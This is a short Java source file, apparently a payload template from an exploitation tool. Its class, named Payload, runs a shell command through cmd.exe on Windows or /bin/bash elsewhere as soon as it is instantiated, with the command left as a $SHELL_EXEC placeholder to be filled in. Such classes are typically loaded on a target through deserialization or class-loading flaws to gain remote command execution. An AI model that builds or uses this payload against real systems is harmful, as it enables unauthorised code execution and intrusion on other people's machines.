public class Payload {

   public Payload() {
        String[] cmd;
        if (java.lang.System.getProperty("os.name").toLowerCase().contains("win")) {
            cmd = new String[] { "cmd.exe", "/C", "$SHELL_EXEC" };
        } else {
            cmd = new String[] { "/bin/bash", "-c", "$SHELL_EXEC" };
        }
        try {
            Runtime.getRuntime().exec(cmd);
        }
        catch(Exception e) {
            e.printStackTrace();
        }
   }

}
